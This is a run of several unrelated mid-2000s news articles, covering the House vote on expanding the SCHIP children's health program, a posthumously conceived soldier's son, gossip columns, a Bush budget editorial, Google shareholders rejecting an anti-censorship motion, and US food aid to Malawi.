WASHINGTON ( MarketWatch ) -- The U.S. House passed an expansion of the State Children 's Health Insurance Program Thursday evening , despite a new veto threat and continued opposition from many Republican representatives .
House lawmakers voted 265 - 142 to approve the new plan , known as SCHIP .
If President Bush carries through with his threatened veto , and precedent indicates that he would , then the tally would fall short of the two - thirds majority needed to override .
Bush criticized the new SCHIP plan , saying that it does n't meaningfully address prior objections .
The revision still calls for an increase in tobacco - product taxes to fund a $ 35 billion expansion over SCHIP 's current $ 25 billion five - year funding baseline .
A current extension of SCHIP expires in mid-November .
" Of course [ the president ] would veto it , " said Tony Fratto , a White House spokesman .
" In some ways , this bill is worse than the previous bill .
It raises taxes on working Americans to move people from private insurance to public assistance .
No tax increase of any kind is needed to fund this program . "
The revised plan cuts off eligibility for children in families making more than three times the federal poverty level , with the exception of New Jersey 's grandfathered state plan .
That puts the threshold this year at about $ 62,000 for a family of four .
Bush has said SCHIP should focus on families earning less than double the federal poverty line .
“ ' In some ways , this bill is worse than the previous bill .
It raises taxes on working Americans to move people from private insurance to public assistance . ' ” — Tony Fratto , White House spokesman
The president has said that he would be willing to sign a bill with a larger expansion than the $ 5 billion he proposed .
However , he has criticized an expansion that would be a " step toward federalization of health care . "
Aiming to pacify GOP lawmakers , the revision would tighten income - eligibility levels , speeds the elimination of coverage for childless adults and strengthens citizenship verification requirements .
Last week , the House failed to override Bush 's veto of the earlier SCHIP bill , missing the two - thirds majority needed with 273 voting to override and 156 against .

Democrats hope that the revised bill will gain support from some lawmakers who may be closer to the fence .
Speaker Nancy Pelosi , D - Calif. , said Wednesday evening that the revised bill addresses all of the concerns expressed by Republicans and the president .
" It clarifies the language on the claim that was made that people making $ 83,000 a year could receive SCHIP -- that was patently not true , and it is clarified in the legislation that it is not so , " she added .
The bill is also explicit in stating that illegal immigrants are n't eligible for federal funding .
Further , adults without children will be phased out of the program over one year , rather than the previously proposed two years .
Senate Finance Committee Chairman Max Baucus , D - Mont. , supports the revision .
" We 've addressed the concerns raised by many who voted against the original SCHIP reauthorization bill , and the result is strong legislation that ought to garner even broader , more bipartisan support , " he said .
House Minority Whip Roy Blunt , R - Mo. , said that Pelosi should have delayed the vote on SCHIP due to the fires in California .
There were at least seven representatives in California , absent from the vote , that would have been " no " votes , according to a spokesman for Blunt .

• Two years after the father died , his son , Benton Smith , was born

Editor 's note :
In our Behind the Scenes series , CNN correspondents share their experiences covering news and analyze the stories behind events .
AUSTIN , Texas ( CNN ) -- Sometimes , when I sit down for an interview , there 's a certain formality .
I 'm in one chair .
The person I 'm speaking to is in another .
Not on this story .
In a living room in Austin , Texas , I was on the floor .
The subject of our story was grabbing my face , fascinated with my teeth and whatever else caught his attention .
Yet it seemed appropriate .
Benton Smith is an adorable , 8 - month - old boy on the verge of walking .
For one so young , he seemed typical when it came to exploring something new -- like my mouth .
" Maybe he wants to be a dentist , " I said .
But what is n't typical about Benton is how he came to be .
Benton 's mom is Kathleen Smith , better known to friends as " K.C . "
" He was born July 14 , 2006 , " she said .
" Two years after his dad passed away ? " I asked .
" Pretty much almost exactly two years , " she said .
( Watch Kathleen and her ' miracle ' baby )
If the math strikes you as odd , it should .
Benton 's father was dead more than a year before his son was conceived .
The story of Brian Smith 's life , and his legacy , is a mix of modern science and the trauma of the Iraq war .
" He was my best friend in the world , and the love of my life , " said K.C .
How they met
K.C. said she and Brian met in Austin in 1992 .
She was 27 .
He was 19 .
They shared a love for historical societies and re-enactments .
Lots of her photographs show them in Elizabethan costume .
They lived together for 10 years , but when they decided to start a family , they married .
About a year later , Brian decided to change careers .
He was an attorney , but at age 29 , he was getting restless .
In 2002 , he joined the Army , partly out of a sense of duty , partly because of a family history with the military .
In January 2004 , Brian shipped out to Iraq to serve as a tank commander .
On July 2 , 2004 , 2nd Lt. Brian Smith got out of his tank at a checkpoint .
A sniper fired a shot that hit him in the small side opening of his protective vest .
The bullet hit his liver and he bled to death .
" When he died , it was really devastating , " said K.C. " I thought my world had ended when he died . "
Her world was about to change .
Before Brian left for Iraq , the couple had n't succeeded at having a baby .
Brian donated his sperm so K.C. could keep trying while he was away .
They never really considered he might not come home .
Brian signed a document that stated in the event of his death K.C. could decide whether to use his sperm .
Based on that , she made the decision to have Brian 's baby .
" Did he ever say , if he died it would be OK for you to get pregnant with his sperm ? " I asked .
" We had never discussed it , " said K.C. " But there was never a doubt in my mind , because ... we wanted children .
This is one of the potential children we would have had .
So what 's wrong with having a baby I would have had , even though he 's not here ? "
Family reaction
At first , Brian 's mother , Linda Smith , was upset .
She worried about K.C. raising a child on her own .
And K.C. says her mother - in - law questioned whether the decision could be made without Brian being there to approve .
" What did you say to your mother - in - law when she objected ? "
" I said , ' Linda , this is my life , and I really want to have Brian 's child . ' "
K.C. convinced her in - laws this was the right thing to do .
On the third try with in - vitro fertilization , she got pregnant .
Nine months later , Benton was born , two years after his father passed away .
During our reporting , we learned that Benton is not alone .
A spokesman from the Veterans Administration said in an e-mail that there are two other known cases in the last three years where the sperm of deceased soldiers was used to create life after death .
The e-mail said the decision to grant health benefits to these children is made case by case .
K.C. is n't sure if Benton will be covered .
Later in the day of our interview , K.C. and I strolled toward a playground .
She pushed a baby jogger , while Benton sat inside , his baby blue eyes gazing at the scenery .
I asked what it 's like to be a new mother and a widow : " Do you feel the loss of Brian when you feel the warmth of Benton ? "
" Yes , " said K.C. " That his dad wo n't see the miracle he helped produce .
I mean , this is the baby we would have had , and he will never see him . "
Days later , I reflected on this story and felt encouraged .
I realized K.C. and Benton will always have to cope with Brian 's death .
But I also saw that this boy who K.C calls a " miracle " is , in the end , a happy kid with a dedicated mom .
And for Benton , it seemed , even though his dad died two years before he was born , his father was , in a sense , present in his life .
" I will tell Benton his dad was a hero , " said K.C. , adding that every day she tells Benton stories about his daddy , the man who gave him life , only after he lost his own .

Do you want to know a secret ?
The death of Nigel Dempster robs the media of the doyen of the gossip column .
But in this increasingly celebrity - obsessed world has the " gossip- isation " of the news rendered the columns redundant ?
We 've always had a secret passion for gossip .
The first issue of the Times newspaper , then called the Daily Universal Register , carried a letter complaining that " the destroyers of reputation , and feeders on calumny , have sometimes been fully gratified in certain prints which may be termed ' Schools of Scandal ' " .
At the same time , French pamphleteers were offering scurrilous and fantastical details of Marie Antoinette 's sex life .
And in the 200 years since , gossip has gone from back - street surreptitiousness to front - page dominance , with the late Nigel Dempster credited as having revolutionised its status in British newspapers .
You get to go to all these parties , but the great secret is that 99 % of them are absolutely dreadful
Hugo Rifkind
Times diary columnist
The gossip or diary story is a unique animal , traditionally uncomfortable in the main pages of the newspaper .
If a film star shouted at a traffic warden , or the chancellor sneezed in the Peruvian ambassador 's soup at a state dinner , these might be diary items .
Gossip , often worryingly accurate , about the ailing state of marriages amongst celebrities and minor aristocracy , were the bread and butter of Dempster 's column .
Hugo Rifkind , who writes the People diary in the Times , and has also penned a novel , Overexposure , set in the world of gossip journalism , says the diary column is still unique .
World of intrigue
" It can be quite subtle and self - referential .
You can go on about how you write the stories , how you get the stories , you can write the whole conversation into the experience . "
The diary column allows the ordinary reader access into a world of " star - studded " parties and intrigue , although hardened gossip - peddlers can find the experience wearing .
If you can identify this man you may be a gossip column reader
" You get to go to all these parties .
But the great secret is that 99 % of them are absolutely dreadful .
It 's tremendously exciting the first two or three you go to but then you realise it 's the same people , the same canapés and the same booze .
" The journalists are pretending to people they are friends , and the [ celebrities ] are representing that they are just out [ for a party ] and would n't dream of speaking to a diarist , but in fact they are promoting something .
" I go out fairly infrequently myself .
I discovered early on that I 'm bad at looking people in the eye and then being rude about them . "
Founding Daily Mirror 3 AM girl , Jessica Callan , whose father Paul was a diarist on the Daily Mail and succeeded by Dempster , says the gossip column still gives the newspaper reader something different that counteracts the glossy view of celebrities .
" You go to a gossip column , it 's not on the whole nice stories - it 's about someone having a fight with someone else or a celebrity running off with someone 's partner .
It is a little out of the ordinary .
It is the reality of the stars .
Nigel Dempster was regarded as the doyen of the genre
" It 's not glamorous .
Sometimes , you have to trick your way in . "
And Callan , who recently wrote Wicked Whispers , her account of her time on the 3 AM pages , says the stars can be cynical in their pursuit of publicity .
" On the whole pretty much , more or less , [ they ] say anything or allow something to be made up about them .
Gossip columnists , celebrities and public relations people all equally need each other . "
A classic diary column confection , Callan says , is the celebrity stalker .
Stories about said stalker often have little or no basis in fact .
But in the era of starlets showing off their decolletage on the front of journals as august as the Daily Telegraph , and gossipy items throughout most tabloids , one might imagine that the dedicated columns had lost some of their steam .
Dempster predicted Harold Wilson 's resignation
The journey has gone from readers of serious newspapers allowing themselves a little peek at a gossip column covering establishment and aristocracy figures to today 's situation , where virtually anything goes .
Diarists are driven into a world of conveying colour as much as actual titbits of gossips .
" The territory of the diary has shrunk .
It has changed it , " Rifkind says .
" I do n't run as story - heavy . "
Rifkind says one of the items he was most proud of was the observation that before every major speech , Tony Blair had a tendency to wear the same Olympic tie .
Having changed the face of newspapers , the gossip column may have been driven into a new habitat of colour and quirkiness .
But it lives on nevertheless .
The popularity of gossip comes as no surprise to evolutionary psychologists as there is a common view that gossip is important in establishing and maintaining social groups and may have been important in how language first evolved .
When this is considered , it is also no surprise to see how popular Big Brother is - it is a universal social arena where viewers can gossip amongst themselves about all the latest goings - on .

With ' citizen journalism ' and instant messaging / photo upload now in the mainstream , gossip columns are going to have to faster and faster to keep up .
I can see gossip by text and RSS feed .
And with so many micro- and transitional celebrities , we could do with a classification system so we can prioritise our gossip feed requests .
( The Juicy Decimal System ? ) .
Nigel Macarthur , London , England
Sadly for those of us that buy a newspaper to read about news , the growth of gossip column trivia over the years is just further evidence of the newspaper industry becoming increasingly besotted by banal and really quite irrelevant people and events .
Who cares what the daughter of some hotel chain magnet does , or the otherwise talentless sibling of some yesteryear sports personality ?
The real world has many more interesting , important , educational and thought provoking issues with which to engage newspaper readers .
The world of tabloid jounalism does not make much effort to enrich the lives of everyday people in terms of what is happening in the world around them ... even when they do attempt to do so , tabloids mostly print sensationalist articles , often blatently biased and only loosely based on facts ... if we are lucky !
Kim Potter , Hungerford
Please talk about the performance , not the performer ... whether the person is an actor or musician or a politician or a sportsperson , can you not concentrate on whatever it is that brings them into the public eye , not the minutae of their private lives .
I am no more interested in hearing about it than most of them are in having their privacy breached in this way !
Megan , Cheshire UK
I Like many and I mean MANY do not , have never and will never care less what Gossip columnists , celebrates or anyone else does with their private lifes - Please BBC / ITV / Sky stop reporting this pointless rubbish

The funny thing is , Kim Potter , that you followed this link with the name " gossip " in it anyway ...

The release of the White House midsession budget review is an annual event normally marked by a few wonkish observations and the routine updating of various spreadsheets , not by a full - dress presidential dog- and - pony show .
But President Bush plans to preside today , with members of Congress and invited guests in attendance .
By all indications , including his own in his weekly radio address last Saturday , he plans to turn this into a celebration — just in time for the fall campaign .
This is proof , if anyone still needs it , that this administration is desperate for something to boast about .
On Mr. Bush ’s watch , triple - digit budget surpluses have turned into annual triple - digit budget deficits .
There ’s no information in the midsession report to alter that utterly dispiriting fact .
Yes , the report is expected to project that this year ’s deficit will be somewhat less gargantuan than last year ’s — probably somewhere between $ 280 billion and $ 300 billion , versus a $ 318 billion shortfall in 2005 .
That ’s not much to crow about .
But Mr. Bush is likely to gloat , anyway .
Earlier this year , the administration conveniently projected a highly inflated deficit of $ 423 billion .
With that as a starting point , the actual results can be spun to look as if they ’re worth cheering .
The razzle - dazzle wo n’t end there .
As he did in his remarks on Saturday , Mr. Bush is sure to use today ’s event to credit tax cuts for a projected “ surge ” in tax revenue .
The Treasury is expected to take in about $ 250 billion more in 2006 than in 2005 , for a total take of $ 2.4 trillion .
Devoid of context , the number looks impressive .
An attempt to force Google to stop censoring its search results in repressive countries has been rejected by its shareholders .
The office of the comptroller of New York City , which oversees New York City pension funds , proposed the motion at the search giant 's annual shareholder yesterday .
The proposal called on Google to resist attempts at censorship , tell people when it is censoring search results , and tell people what data it is retaining .
It won support from Amnesty -- one of many human rights groups who criticised the company in early 2006 for bowing to pressure from the Chinese government and censoring its search results in China .
The motion also named Belarus , Burma , Cuba , Egypt , Iran , North Korea , Saudi Arabia , Syria , Tunisia , Turkmenistan , Uzbekistan , and Vietnam as countries where governments restrict access to Internet content .
New York 's pension funds own 500,000 shares , giving them a stake worth $ 235 m .
Google 's total market capitalisation is $ 144bn .
Patrick Doherty , representing the comptroller 's office , told the meeting that censorship ran counter to the corporate values of Google , whose informal corporate motto is " Do n't be evil . "
Mr Doherty received light applause from his fellow shareholders , according to the San Francisco Chronicle who attended the meeting at the search giant 's Californian headquarters .
But Google 's top management , who cast 66 % of its votes , did not support the plan , and thus it was rejected .
Co-founder Sergey Brin admitted earlier this year that the Chinese censorship had damaged the company .
" On a business level , that decision to censor ... was a net negative , " said Mr Brin , speaking at the Davos World Economic Forum in January .
Those who invested in the company at the time of its flotation have seen their stakes rocket in value .
Its shares have risen from $ 85 to $ 461 , fuelled by rapid growth in revenues from internet advertising .
But with chief executive Eric Schmidt and co-founders Larry Page and Mr Brin controlling two - thirds of the voting power , today 's vote shows that smaller shareholders have no realistic hope of forcing the company to accept a policy that they disagree with .
The trio own around 31 % of the stock between them , but as Class B shareholders they get 10 votes per share .
Class A shareholders get a single vote per share .
An attempt to end this was defeated at last year 's shareholder meeting , by the very top executives whose power it would have diluted .
In other news , shares in Yell were up nearly 2 % in morning trading in London , amid market talk that the directory firm could be a Google takeover target .
It 's early May and Malawi seems to be awash with corn .
On the roads , trucks heavy with pale yellow maize heads rumble from the fields ; in the villages nearly every woman and child is at work stripping the little kernels from their cobs , singing the harvest songs that give a rhythm to their work .
Other women are pounding the maize with a giant pestle and mortar into flour to make the national staple dish - nzima - corn mash .
( The men mostly seem to be occupied drinking the new season 's maize beer . )
It has been the best harvest in a dozen years or more .
So why - and this is what we 've come here to ask - in this time of historic plenty , is the rich world still sending its unwanted food to Malawi ?
This little southern - African country has had a rough decade .
Staggering under the effects of an Aids epidemic that affects one in five of the population in some districts , there were famines here in 2002 , 2003 and one in 2005 , when a third of Malawi's 13 million people ran out of food .
Until this April , over 300,000 were still being fed emergency rations by the United Nations World Food Programme .
Malawi deserved a good year .
But record harvests do n't necessarily guarantee good times .
' We have so much maize this year - thanks be to God , ' says Felicita Bailoni .
' But we have a problem over where to sell it .
It 's not just that the price is so low because there is so much maize , there is n't anyone to sell it to .
The traders normally visit the village but they have n't come . '
Felicita , 59 , talks as she rubs the kernels from a cob into a basin before her .
Even in the time of plentiful food she 's worried .
She and her husband Stephen look after her two grandchildren , whose mother died three years ago , and two other orphans .
Most households in their village , Kunthembwe , have taken in the children of those who have died from Aids - which is particularly severe here around Blantyre in southern Malawi .
Felicita and her enlarged family have more than enough food for today and for the year ahead - but they need cash to pay the children 's school fees , for clothes and other necessities .
And maize corn is so plentiful at the moment it fetches only eight Malawian kwacha , or about 3 p a kilo - if you can sell it .
In 2005 , the price went up to 50 kwacha a kilo .
The Bailonis are hoping to sell 100 50kg bags of corn ears - the cobs are lying round the back of their two - room house in a vast wooden cradle designed to keep the rats away .
' But if we wait till the price goes up , the weevils will spoil our maize , ' says Felicita .
' We can only sit and worry . '
' The price is so low , ' says Charles Rethman , a Malawi - based analyst of what the NGOs call ' food security ' , ' that we have a concern now about next year .
Farmers will be put off growing maize , and they wo n't have the cash to buy the seeds for the next planting .
So in 2008 we 're looking at the possibility of another food crisis .
So it 's really important that we do everything we can to get the price up to a level that rewards the farmers . '
With so much cheap corn available Rethman is bemused by a US government deal , announced in April , to ship $ 19.5 million of American corn and soya to Malawi as food aid .
' It 's a nonsense , ' he says .
Everywhere I go in the little villages in the shadow of Michiru mountain I hear the same story .
Plenty of maize but no market .
This affects the very poorest .
In one village I meet Lena Butao , a 24 - year - old whose mother died last year , her father in 2003 .
( Aids has brought a collapse in life expectancy in Malawi to just 37 years ) .
She looks after her three brothers and sisters , the youngest only 10 .
They managed to harvest 18 bags of maize from their parents ' field , but it wo n't see them through this year .
Lena needs to raise money to pay for school fees , soap , clothes and for medicine .
She 's in the middle of a bout of malaria ; she shivers in the sunshine as she speaks to us .
' Normally I can earn about 500 kwacha ( about £ 1.80 ) a week working in the fields for my neighbours .
But at the moment the farmers do n't have any money .
Life is very difficult . '
Lena had to leave school when her parents first became ill and she thinks now that she 'll never achieve her dream of becoming a housemaid .
The children ate nzima and stewed pumpkin leaves last night : they have n't eaten meat this year .
There 's one good piece of news for Lena : her 10 - year - old brother Joshua 's primary school has become part of the school - feeding programme run by the Malawian government and various aid agencies .
This is a huge undertaking that now reaches over half a million children in the country , 20 per cent of all of those in primary school .
It is playing a major part in addressing the awful fact that almost half of Malawian children have had their physical or mental growth damaged by malnutrition .
And the half a million mugs of porridge served them each day are a guaranteed outlet for the produce of Malawian maize and soya farmers .
The next day , I travel to the village of Kampala and the sprawling red- brick compound of the Catholic Institute primary school .
Built in the 1930s by missionaries , when Malawi was the British colony of Nyasaland , the school looks as though it has n't been touched since .
Most windows are broken and the grounds strewn with rubbish - it 's pretty average for a Malawian school , I 'm told .
In her office , deputy head Annie Nakhouhouma is totting up the attendance figures - today the school is teaching an amazing 6,334 children aged between six and 17 .
Its 21 classrooms can't hold them all so , despite the cold drizzle that 's falling , there are crowds of children under each of the big fig trees that dot the school grounds , in front of each group a blackboard and a teacher .
I peer into one shabby classroom , and count 190 small children sitting inside .
There 's no room for furniture , so they are packed on the floor as close as sardines .
The 10 - year - olds are learning English : ' Hello , mister , how are you ? ' they chant at me .
It 's deafening .
There 's a stranger sight - straight out of Oliver Twist - on the rough ground behind the classroom block .
Hundreds of excited children , each clutching a large mug , are circulating around a camp of vast cooking stoves - 23 of them .
Women in brightly - coloured wraps stir vats of grainy yellow porridge .
This is CSB - corn - soya blend - a mix of maize , meal and soya flour , vitamins and sugar widely used in emergency feeding around the world .
Locally it 's called likuni phala .
I taste it - it 's sweet and nutty , a sort of gritty Ready Brek .
Clouds of steam rise in the damp air as the children gulp the porridge greedily from their mugs - for many of them it's the first meal of the day and for some it will be the only one .
CSB is a wonderful product and the teachers are delighted .
' Look at the children - they are now so energetic .
They do n't fall asleep in class .
They do n't fight over each other 's food , like they used to .
They 're fatter !' says Gertrude Sonani , who teaches 13 - year - olds .
But the effect goes further than just feeding the kids up .
Children come to the school because of the meal - class numbers are up by about 7 per cent in every age group since the feeding programme began in January .
In a country where only 70 per cent of the children attend primary school , that 's an achievement .
At another nearby primary , where an Oxfam partner supplies milk to mix into the free porridge , the head teacher , Annie Jana , told me that she now had 800 eight - year - olds , compared to 500 when the programme started a year ago .
' Absenteeism has fallen , and even children who dropped out are coming back , especially girls . '
And in Malawi , getting girls into school has always been difficult - which is why half of all women are illiterate .
The logistics behind feeding 6,300 children a mug of porridge are quite something .
This programme is funded by the charity Scottish International Relief ( SIR ) , through its local organisation , Mary 's Meals .
They show me a school storeroom where the bags of likuni phala tower high above the piles of textbooks and papers .
Each day the contents of 46 of these sacks , nearly half a tonne , are mixed with water on the stoves and heated and served by volunteers from among the school 's parents .
The cost of the CSB comes out at about four kwacha , about 1.5 p , per child - SIR feeds 175,000 children daily in Malawi at a cost of about £ 5.30 per child per year .
One of the volunteers , Edina Moussa , told me that now her three children actually want to go to school .
' I 'm a widow , ' she said , ' and often it is hard to find enough to feed them . '
She works as hired labour in her neighbour 's fields , earning about 75 p a day .
' Before January , ' she says , ' they were often too tired to come to school .
But now they come every day . '
School feeding is such an obviously good idea that the aid agencies and the Malawian government have been bringing more and more schools into the programme since it began in 1999 .
Most of the CSB comes free from the World Food Programme ( WFP ) , which uses donated corn and soya - some of it from the Malawian government - and more that it buys locally .
At the moment 442,000 children are being fed with CSB by WFP at school , 20 per cent of all Malawi 's primary - school children .
Malawians are proud of the programme : two weeks ago , some 60,000 of them went on sponsored walks to help raise money for school feeding .
Impressed by all this , in April the US Government announced that it wanted to join in .
It would give WFP nearly $ 20 million over three years to help fund an expansion of the programme so , from 2008 , 650,000 Malawian children get a daily mug of porridge at school .
At the same time it announced similar schemes for Kenya , Cambodia , Guinea and Pakistan - a total spend of $ 85.9 million .
WFP applauds the deal .
' It 's a massive donation and a huge boost to the government of Malawi's school - feeding programme , ' the organisation 's country director , Dom Scalpelli , told me .
But not everyone in the country was overjoyed .
' It 's very short - sighted - it does n't make any sense .
It 's going to short - circuit the effort to improve nutrition here , it undermines farmers , households .
It 's not sustainable and it wo n't bring about any long - term change to malnutrition rates , ' said Charles Rethman , echoing many critics of the plan .
The problem is - though WFP left this detail out of their press release - that the US grant came with a condition : it had to be spent on American CSB to be bought from American farmers and put in American ships to be transported to Malawi .
According to WFP , the cost of buying , transporting and packing the annual 8,000 tonnes of US CSB will be $ 812 a tonne .
SIR , which will buy about 3,600 tonnes of Malawian CSB - likuni phala - this year , expects to pay around $ 320 a tonne ( distribution costs add another 5 per cent ) .
Simply , if the American money was spent in Malawi , it could feed nearly two - and - a - half times as many schoolchildren .
Malawians are peaceable and polite people - but there was anger in the voice of one aid worker involved in school feeding when we talked about this .
' This is giving aid with one hand and taking it away with another .
It 's the Big Man saying : kneel down before I give you the help .
These people , they get the food , they are vulnerable , they clap their hands and say , " Thank you Mr Bush " .
They do n't understand what 's really going on . '
Someone who does is the World Food Programme 's man in Malawi , Dom Scalpelli , an amiable Australian who has spent 17 of his 40 years working for the world 's largest humanitarian aid agency .
His defence of this particular policy is slick - he and his colleagues have had to make it many times .
WFP needs the US : 43 per cent of all the food aid WFP provides comes from America , and 98 per cent of it is ' in kind ' - American corn , soya , rice , oil and beans , shipped at considerable expense to where it 's needed .
America boasts that , through these programmes , it feeds 70 million people a year ( it was 100 million during the 1990s ) .
' Listen , ' says Scalpelli , ' the child does n't care if his porridge is Malawian or American .
The important thing is that more of them are going to be getting it .
And American CSB is cheaper than Malawian . '
In fact the two cost about the same , but Scalpelli is being disingenuous .
The price of shipping and administration - and it is US law that American companies are used for packing and shipping 75 per cent of American food aid - puts the cost of the US - sourced CSB at absurdly high levels .
Only a third of the money granted for food aid actually goes on food - the rest is transport and administration .
The US Congress 's Government Accountability Office has criticised the system , saying that a $ 10 - per - tonne cut in shipping rates would enable the feeding of 850,000 more people .
Indeed , Malawi would have done better if the US Government had written WFP a cheque for cost of shipping and administering the grant , and not sent any American food at all .
Surely , I asked Scalpelli , it would be better if the Americans gave cash and you spent it in the Malawian market - you do n't just feed the children but you also support Malawian farmers .
Is n't it a nonsense , when Malawi has just brought in a record - breaking harvest ?
' Yes of course we'd have taken the money and yes , we could have sourced it locally .
But the reality of what we 're living through is that you take advantage of any grain you can get .
The CSB is not displacing the local Malawian CSB - it 's going to schools and it's being eaten , it 's targeted and it's not going on to the market .
The local farmers will still get business from us - and we 'll still buy Malawian CSB . '
' It 's absurd , ' counters Charles Rethman .
' You could feed twice as many children , create jobs , stimulate the maize price and help the farmers .
Anything that will increase demand for farmers is a good thing : this flies in the face of the Malawian government 's development strategy and its attempts to stand on its own two feet . '
The story of how American corn gets in Malawian children 's porridge begins in the great - plains states like Kansas and Iowa , where , as the American food policy critic Michael Pollan puts it , there is ' a plague of cheap corn ' .
It 's a sad tale that begins in 1973 , when the Nixon administration started directly subsidising corn ( maize ) farmers in a way that encouraged them to produce as much as possible .
That policy has meant an ever - increasing excess of American corn , which most years costs the US taxpayer some $ 5 - $ 10 billion to subsidise .
As Pollan says , the money , which in 2005 kept the price of corn at around half what it costs to produce , is in effect a subsidy for the big American companies that buy and process the corn - and these companies and their political supporters are the ones that dictate American farm policy .
Meanwhile the unwanted corn has to go somewhere - and dumping it abroad has always been one of the answers .
Some 20 per cent of US corn is exported , and at times the proportion going as food aid has matched that .
In the 1990s , under the Clinton administration , food aid reached record levels , and the US claimed to feed as many as 100 million people a year in the developing world ( some 850 million are said to be chronically malnourished ) .
In 2003 America provided 56 per cent of all the food aid in the world .
But an indicator that the richest nation 's motives are not entirely charitable is that , throughout those years , America 's food aid volumes increased massively at times when prices in the US were depressed - up to 20 per cent of American cereals production goes abroad as food aid when the market is down , but when domestic prices are high this figure falls to just five per cent .
In 1993 , when global food aid reached an all - time high of 17.3 million tonnes ( in 2005 , the last year for which there are complete records the figure was 8.25 million tonnes ) , US prices of staples like corn and rice were at historic lows .
The many critics of American food aid make the point that the buying up of US farmers ' surpluses is another way of subsidising them - and , most years , federal payments make up about half the income of the average Iowa corn farmer .
Such unprecedented support puts up a wall against farmers from the developing world who want to sell in the markets of the rich .
The European Union abandoned food aid in kind in 1999 - all but two per cent now goes as cash - and Peter Mandelson , as Europe 's trade commissioner , has called for ' radical reform ' from the Americans .
' Food aid for poor countries and emergency relief can be a tool to advance development and for humanitarian relief .
But the US programme is designed to give support to US agricultural producers , ' he said .
But this was generally seen as pretty hypocritical .
Most aid - agency observers reckon the EU has used American intransigence as an excuse to put off reforms of European farm subsidies - like the notorious two euros a day each cow on the continent receives - again , a way of putting up a barrier against the farmers of Africa , South American and Asia .
This produces real absurdities - it's often pointed out that the money the rich world gives in aid to poor countries , often to help improve agriculture , is worth less than what those countries could earn if Europe and America simply reformed their subsidies and opened up their markets .
' Sharing our agricultural abundance ' is the smug phrase that the US agriculture secretary , Mike Johanns , uses to describe food aid .
In most years the US still provides between 55 and 65 per cent of global food aid , 98 per cent of it in the form of food .
The price is enormous - up to $ 2 billion per annum .
Even the relatively modest school - feeding programme is worth $ 200 million this year - 330,000 tonnes of American agricultural products to 17 countries in Africa , Asia and Latin America .
Johanns is actually said to be in favour of reforming food aid , but he showed no qualms when he announced plans to flood these countries - many of them with food surpluses - with US - made porridge for school children in February this year .
' These programmes demonstrate America 's continued compassion and commitment to improve the lives of people around the world , ' he said .
Gawain Kripke , an American who leads Oxfam 's lobbying of the US government on the issue of food aid , disagrees .
' The US 's food - aid programme is meant to be charitable and helpful in nature but it's been picked apart by private interests so that the majority of the benefit goes to US commerce , rather than to people who need help .
There is a debate in Washington over its reform - but the malnourished people of Africa do n't have a seat at the table when US budgets are divided . '
It 's a stock picture on TV - news reports of wars and disasters - sacks of food tumbling into forests of grasping hands from aid lorries .
They often come labelled with a stars and stripes and the words , ' A Gift from the American People ' .
But the gift often has some unpalatable side effects .
' Emergency food aid in humanitarian situations is of course a good thing , but it can be a terribly blunt instrument , ' says Ann Witteveen , Oxfam 's food security coordinator for southern Africa .
It can and does often do more harm than good .
The very promise of free food can cause disaster - hit populations to leave their homes and move to refugee camps .
They may become dependent on it , making it harder for them to take up their lives again when the disaster or danger has passed .
Farmers leave their fields , prices fall and local traders lose their businesses .
Clearly , while food aid saves lives in a disaster , it can hamper the return to normality .
It has done more insidious damage , as detailed by some aid agencies .
Food aid can permanently damage the economies of nations it was sent to help .
Vast tonnages of rice donated by the USA and Japan to Indonesia after the country 's economic collapse in 1997 caused damage to farmers and distributors that has never been repaired : having been one of the world 's largest producers , Indonesia is now a net importer of rice .
All the countries , from Sri Lanka to Indonesia , hit by the tsunami of Boxing Day 2004 , had good supplies of rice available at low cost - yet the US insisted on sending 30,000 tonnes of US rice and other food after the disaster .
In Afghanistan it has been suggested that one of the reasons that Afghan farmers have turned to opium - poppy production is that the market for the wheat they used to farm had become too unreliable since the US - led invasion of 2001 opened the door for massive amounts of food aid .
' A lot of food aid is incredibly silly , ' sighs Ann Witteveen .
' Markets in southern Africa are n't terribly efficient and it is hard to prove how food aid affects them .
But what farmers and traders need is predictability and stability in the market and food aid is a major destabilising factor . '
Malawi itself has a blatant example of the damage that can be wrought by food aid .
In 2002 , a crisis was predicted , after a shortfall of 600,000 tonnes in the harvest .
Unusually , the international community provided exactly what had been appealed for - but the sums were wrong .
Malawi was flooded with cheap grain and the price of maize dropped from $ 250 a tonne to $ 100 a tonne during 2003 .
Malawian farmers suffered : the loss to the Malawian economy was estimated at $ 15 m , and local production of not just maize but also of key crops like cassava and rice dropped massively .
All this made it harder for Malawi to return to self - sufficiency when the crisis was over .
Even last year , when Malawi had a 250,000 tonne surplus of maize , the US still shipped in over 40,000 tonnes of American food as aid .
Some of this food aid is not even for the hungry : it is passed on to favoured US - based NGOs like Save the Children ( US ) , World Vision and Care to be ' monetised ' - sold and used for cash to pay their salaries and costs .
In 2004 , for example , America donated 22,000 tonnes of white - wheat flour for aid agencies working in Eritrea to sell on the open market and use the funds for their operations .
This year the US aid agency Care announced that it was going to phase out this system of funding by the year 2010 .
But in 2005 , 22 per cent of all food aid was sold , not distributed , in the countries it was sent to .
From across the world , there are stories of how , once a dependency on food aid has been established and local production destroyed , the aid stops and commercial supply begins - not so different and hardly more moral than the tactics of a drug pusher .
This has happened with American soya beans in the Philippines and Japanese rice in Jamaica .
Subsidised dairy produce from Europe has , according to Oxfam , put milk farmers out of business in a number of Caribbean countries .
One senior international - agency official once told me he had a new idea for the business of aid delivery .
' It 's called the JGTTM strategy : Just Give Them The Money ' .
And indeed this is becoming a popular strategy .
As Dom Scalpelli says , cash handouts are often a good and efficient strategy for helping the hungry , if local markets have enough supply .
' Local and Regional Procurement ' is so much talked about in the world of food aid that it has its own acronym - LRP , and it is the stated preferred option of WFP .
Scalpelli is proud that his agency will this year buy some of that Malawian surplus in order to feed the hungry in neighbouring Zambia and Zimbabwe , hit by drought and , in Zimbabwe 's case , economic meltdown .
Food aid could be on the way out .
Corn prices are high in the US this year , and the futures market is very excited at the prospects of using those great grain mountains for producing ethanol - bio -diesel - and thus addressing another of the rich world 's pressing problems .
Europe , Canada and Australia have all been persuaded to convert some or all of their food - aid programmes to cash , rather than in kind .
Among the major donors only America , Japan and China hold out .
There is mounting pressure in the US for changes in the food - aid system , driven by a damning report from the US Congress about the inefficiencies .
It highlighted the $ 171 a tonne that US carriers charge , compared with the $ 100 a tonne WFP can normally get from its own contractors .
It also found that US food aid frequently is contaminated or infested by insects by the time it arrives in the country that needs it .
The Bush administration 's current , modest proposal is that a quarter of the food - aid budget for emergency food ( which most years is more than half the total ) should be spent in destination countries .
